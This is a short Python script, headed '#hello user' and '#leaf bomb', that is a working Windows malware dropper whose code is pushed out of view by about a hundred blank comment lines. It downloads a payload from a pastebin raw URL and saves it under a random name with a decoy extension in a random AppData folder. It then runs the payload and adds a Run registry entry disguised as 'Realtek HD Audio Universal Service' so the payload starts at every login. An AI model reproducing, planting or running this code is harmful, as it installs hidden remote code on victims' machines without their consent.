#hello user
#leaf bomb
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

def g3tP4th():
    p3thpizza = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(p3thpizza)
    for _ in range(10):
        chosen = choice(directory)
        ye = p3thpizza + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def g3tN4m3():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def inst334ll(p3thpizza):
    with open(p3thpizza, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("https://pastebin.com/raw/Yzc53jUJ").read().decode("utf8"))

def run(p3thpizza):
    system(f"start {executable} {p3thpizza}")

def st3rt6P(p3thpizza):
    f4k3d = 'SecurityHealthSystray.exe'
    addr3ss = f"{executable} {p3thpizza}"
    k2y1 = winreg.HKEY_CURRENT_USER
    k2y2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    op3n_ = winreg.CreateKeyEx(k2y1, k2y2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(op3n_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{f4k3d} & {addr3ss}")



DoYouKnowTheWay = g3tP4th() + '\\' + g3tN4m3()
inst334ll(DoYouKnowTheWay)
run(DoYouKnowTheWay)
try:
    st3rt6P(DoYouKnowTheWay)
except:
    pass